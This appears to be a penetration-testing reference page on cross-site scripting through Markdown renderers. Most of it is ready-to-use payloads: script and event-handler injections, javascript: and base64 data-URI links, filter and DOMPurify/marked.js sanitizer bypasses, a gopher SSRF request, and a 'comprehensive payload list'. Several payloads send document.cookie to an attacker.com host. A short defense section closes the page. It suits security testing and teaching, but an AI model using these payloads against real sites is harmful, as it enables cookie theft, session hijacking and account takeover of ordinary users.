# XSS

## XSS in Markdown

### Overview

**Markdown XSS** is a cross-site scripting vulnerability that occurs when user-controlled Markdown input is converted to HTML without proper sanitization. Markdown parsers often allow embedded HTML, JavaScript links, and event handlers, creating multiple attack vectors.

**Why Markdown is vulnerable:**

* Many parsers accept raw HTML by design
* JavaScript protocol in links often permitted
* Event handlers in HTML attributes processed
* Base64 data URIs allowed
* Inconsistent sanitization between parsers

**Common vulnerable applications:**

* Comment systems (GitHub, GitLab, Reddit)
* Documentation platforms (Wiki, Confluence)
* Note-taking applications (Notion, Obsidian)
* Blogging platforms (Medium, Ghost)
* Messaging systems (Slack, Discord)

**Impact:**

* Account takeover (cookie theft)
* Phishing attacks
* Malware distribution
* Session hijacking
* Data exfiltration

***

### Exploitation Workflow Summary

```
1. Identification
   ├─ Locate Markdown input fields
   ├─ Identify parser type (CommonMark, GitHub, etc.)
   ├─ Test for HTML rendering
   └─ Check sanitization level

2. Basic Exploitation
   ├─ HTML tag injection
   ├─ JavaScript protocol links
   ├─ Image event handlers
   └─ Data URI schemes

3. Bypass Techniques
   ├─ Case manipulation
   ├─ Encoding variations
   ├─ Parser-specific quirks
   └─ Sanitizer misinterpretation

4. Advanced Exploitation
   ├─ HTML sanitizer bypass
   ├─ Markdown/HTML hybrid attacks
   ├─ Protocol handler abuse
   └─ Out-of-band techniques

5. Impact Demonstration
   ├─ Cookie theft
   ├─ Keylogging
   ├─ Phishing overlays
   └─ Data exfiltration
```

***

### Understanding Markdown XSS

#### How Markdown Parsers Work

**Markdown to HTML conversion:**

```markdown
# Heading
**Bold text**
[Link](https://example.com)
```

**Converts to:**

```html
<h1>Heading</h1>
<p><strong>Bold text</strong></p>
<p><a href="https://example.com">Link</a></p>
```

**The vulnerability:** Most Markdown parsers allow raw HTML mixing with Markdown, enabling XSS:

```markdown
# Safe Markdown
<script>alert(1)</script>  <!-- Raw HTML executed! -->
```

***

### HTML Tag Injection

#### Classic XSS Tags

**Script tag injection:**

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script src="https://attacker.com/evil.js"></script>
```

**Why it works:**

* Many Markdown parsers pass HTML through untouched
* Backwards compatibility with existing HTML content
* "Feature not bug" mentality in parser design

**Image tag with onerror:**

```html
<img src="x" onerror="alert(1)">
<img src="invalid" onerror="fetch('https://attacker.com/'+document.cookie)">
```

**SVG with script:**

```html
<svg onload="alert(1)">
<svg><script>alert(1)</script></svg>
```

**Iframe injection:**

```html
<iframe src="javascript:alert(1)"></iframe>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

**Other event handlers:**

```html
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>
<marquee onstart="alert(1)">
<details open ontoggle="alert(1)">
```

***

### JavaScript Protocol Links

#### Basic JavaScript Links

**Standard markdown link syntax:**

```markdown
[Click me](javascript:alert(1))
[Steal cookies](javascript:fetch('https://attacker.com/'+document.cookie))
```

**Why it works:**

* Markdown parsers treat `javascript:` as valid URI scheme
* Click required (not as severe as automatic XSS)
* Often bypasses basic filters

**Complete examples:**

```markdown
[Basic XSS](javascript:alert('Basic'))
[Cookie theft](javascript:prompt(document.cookie))
[Execute code](javascript:eval(atob('YWxlcnQoMSk=')))
```

#### Case Manipulation

**Bypassing case-sensitive filters:**

```markdown
[Test](JaVaScRiPt:alert('CaseInsensitive'))
[Test](JAVASCRIPT:alert(1))
[Test](javascript:alert(1))
```

#### Newline Injection

**URL with newline bypass:**

```markdown
[Test](javascript://www.google.com%0Aalert('URL'))
[Test](javascript://%0d%0aprompt(1))
```

**How it works:**

* `%0A` is newline character
* Makes URL appear "safe" before newline
* JavaScript after newline still executes

#### Quote Variations

**Different quote styles:**

```markdown
[Test]('javascript:alert("InQuotes")')
[Test]("javascript:alert('InQuotes')")
[Test](javascript:alert(`InQuotes`))
```

#### Space Injection

**Spaces to bypass pattern matching:**

```markdown
[Test](j a v a s c r i p t:prompt(document.cookie))
[Test](java script:alert(1))
```

#### Error Handler Abuse

**Throw error to trigger handler:**

```markdown
[Test](javascript:window.onerror=alert;throw%201)
[Test](javascript:window.onerror=confirm;throw%20document.cookie)
```

**How it works:**

1. Set `window.onerror` to `alert` function
2. Throw error with `throw 1`
3. Error triggers `alert(1)`

***

### Data URI Schemes

#### Base64 Encoded HTML

**Basic data URI:**

```markdown
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

**Decoded payload:**

```html
<script>alert('XSS')</script>
```

**Creating base64 payload:**

```bash
echo -n "<script>alert('XSS')</script>" | base64
# Output: PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

**Complete examples:**

```markdown
<!-- Alert box -->
[Click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

<!-- Cookie theft -->
[Click](data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9hdHRhY2tlci5jb20vJytkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+)
```

**Image with data URI:**

```markdown
![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

***

### Image Event Handler Injection

#### Onerror Exploitation

**Basic syntax abuse:**

```markdown
![Uh oh...](<"onerror="alert('XSS')>)
```

**How it works:** Parser creates: `<img src=""onerror="alert('XSS')" alt="Uh oh...">`

**Onload variant:**

```markdown
![Test](<https://example.com/image.png"onload="alert('XSS')>)
```

**Multiple event handlers:**

```markdown
![XSS](<"onerror="alert('ImageOnError')>)
![XSS](<https://example.com/img.png"onload="alert('ImageOnLoad')>)
```

#### Escape SRC Attribute

**Close src and inject event:**

```markdown
![Escape SRC](<https://example.com/image.png"onload="alert('Escaped')>)
![Escape SRC](<"onerror="alert('NoSrc')>)
```

**Why it works:**

* Markdown parser doesn't properly escape `"` in URL
* Results in: `<img src="url"onerror="alert(1)">`
* Browser interprets as two separate attributes

***

### HTML Sanitizer Bypass

#### DOMPurify + Marked.js Bypass

**Vulnerable pattern:**

```javascript
// Sanitize first, then parse markdown
const sanitized = DOMPurify.sanitize(userInput);
const html = marked.parse(sanitized);
document.body.innerHTML = html;
```

**Why it's vulnerable:**

* DOMPurify sanitizes as HTML
* Marked.js interprets as Markdown
* Different parsing rules = bypass opportunity

#### Bypass Payloads

**Method 1: Div ID injection**

```markdown
<div id="1

![](contenteditable/autofocus/onfocus=confirm('XSS')//index.html)">
```

**Method 2: Anchor title**

```html
<a title="a

<img src=x onerror=alert(1)>">yep</a>
```

**Method 3: Style tag abuse**

```markdown
[x](y '<style>')<!--
</style>
<div id="x--><img src=1 onerror=alert(1)>"></div>
```

**Method 4: Paragraph with style**

```markdown
[
<p x="<style onload=eval(atob(/BASE64_PAYLOAD/.source))>](#"></p>
)
```

**Method 5: Backtick bypass**

```markdown
`<p x="`<img src=x onerror=alert(1)>"></p>
```

**How these work:**

1. HTML sanitizer sees incomplete/malformed tags
2. Markdown parser completes/interprets differently
3. Final HTML contains XSS

***

### Protocol Handler Abuse

#### Gopher Protocol

**Send arbitrary HTTP requests:**

```markdown
![pwn](gopher://127.0.0.1:1337/_GET%20/api/dev%20HTTP/1.1%0D%0AHost:%20127.0.0.1:1337%0D%0Ax-api-key:%20934caf984a4ca94817ead87d37af4b3%0D%0AConnection:%20close%0D%0A%0D%0A)
```

**Use case:**

* SSRF via Markdown
* Access internal services
* Bypass authentication

**Decoded request:**

```http
GET /api/dev HTTP/1.1
Host: 127.0.0.1:1337
x-api-key: 934caf984a4ca94817ead87d37af4b3
Connection: close
```

#### VBScript Protocol (IE Only)

```markdown
[Click](vbscript:alert(document.domain))
[Click](vbscript:MsgBox("XSS"))
```

***

### Advanced Bypass Techniques

#### Entity Encoding

**HTML entity obfuscation:**

```markdown
[XSS](javascript:alert(1&#41;)
[XSS](javascript&#58this;alert(1&#41;)
[XSS](Javas&#99;ript:alert(1&#41;)
```

**Decimal encoding:**

```markdown
[XSS](Javas%26%2399;ript:alert(1&#41;)
[XSS](javascript:alert&#65534;(1&#41;)
```

#### Unicode Tricks

**Zero-width characters:**

```markdown
[XSS](�javascript:alert(1))
```

**Alternative character sets:**

```markdown
[XSS](javascript:new%20Function`al\ert\`1\``;)
```

#### Comment Injection

**HTML comments:**

```markdown
<!--<script>alert(1)</script>-->
```

**Sometimes rendered by parser, executed by browser**

#### Nested Markdown

**Markdown within markdown:**

```markdown
[ ](https://a.de?p=[[/data-x=. style=background-color:#000;z-index:999;width:100%;position:fixed; data-y=.]])
```

### Testing Methodology

#### Step 1: Identify Markdown Input

**Look for:**

* Comment sections
* Bio/profile fields
* Issue/ticket descriptions
* Documentation editors
* Chat/messaging fields

#### Step 2: Test HTML Rendering

**Basic test:**

```markdown
<b>Bold test</b>
<script>alert(1)</script>
```

**If `<b>` renders but `<script>` doesn't:**

* HTML partially allowed
* Script tags filtered
* Try other vectors

#### Step 3: Test JavaScript Links

```markdown
[Test](javascript:alert(1))
[Test](JaVaScRiPt:alert(1))
[Test](java script:alert(1))
```

#### Step 4: Test Data URIs

```markdown
[Test](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```

#### Step 5: Test Event Handlers

```markdown
![test](<"onerror="alert(1)>)
![test](<https://x.com/a.png"onload="alert(1)>)
```

***

### Comprehensive Payload List

#### JavaScript Protocol Variants

```markdown
[XSS](javascript:prompt(document.cookie))
[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
[XSS](javascript:alert('XSS'))
[XSS](JaVaScRiPt:alert(1))
[XSS](javascript://www.google.com%0Aalert(1))
[XSS](javascript://%0d%0aprompt(1))
[XSS](javascript://%0d%0aprompt(1);com)
[XSS](javascript:window.onerror=alert;throw%201)
[XSS](javascript:this;alert(1))
[XSS](javascript:this;alert(1&#41;)
[XSS](javascript&#58this;alert(1&#41;)
[XSS](Javas&#99;ript:alert(1&#41;)
[XSS](javascript:confirm(1))
[XSS](javascript:alert(document.domain&#41;)
[XSS]('javascript:alert("1")')
[XSS](javascript:new%20Function`al\ert\`1\``;)
```

#### Data URI Variants

```markdown
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

#### Image Event Handlers

```markdown
![XSS'"`onerror=prompt(document.cookie)](x)
![XSS](https://www.google.com/image.png"onload="alert(1))
![XSS]("onerror="alert(1))
```

#### Reference-Style Links

```markdown
[lol]: (javascript:prompt(document.cookie))
[XSS]: (javascript:prompt(document.cookie))
```

#### VBScript (IE Only)

```markdown
[XSS](vbscript:alert(document.domain))
[XSS](vbscript:MsgBox("XSS"))
```

***

### Parser-Specific Quirks

#### GitHub Flavored Markdown

**Blocked:**

* `<script>` tags
* `javascript:` in most contexts
* Event handlers

**Allowed:**

* Some HTML tags (`<details>`, `<summary>`)
* SVG elements (sometimes)

**Test payload:**

```markdown
<details open ontoggle="alert(1)">
<summary>Click</summary>
Content
</details>
```

#### CommonMark

**Stricter than GFM:**

* Raw HTML often disabled by default
* JavaScript links blocked

**Configuration-dependent:** Check if `html` extension enabled

#### Showdown.js

**More permissive:**

* Allows most HTML by default
* JavaScript protocols often work

***

### Defense & Prevention

**Input sanitization:**

* Use well-maintained sanitization libraries
* DOMPurify for HTML sanitization
* Sanitize AFTER markdown parsing, not before
* Disable HTML in markdown parser if possible

**Content Security Policy:**

```html
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Markdown parser configuration:**

```javascript
// Disable HTML in markdown
marked.setOptions({
  sanitize: true,
  sanitizer: DOMPurify.sanitize
});

// Or use safe parser
const safeMarked = marked.use({
  extensions: [],
  gfm: false,
  breaks: false
});
```

**Safe rendering order:**

```javascript
// 1. Parse markdown
const html = marked.parse(userInput);

// 2. Sanitize resulting HTML
const safe = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href']
});

// 3. Render
element.innerHTML = safe;
```
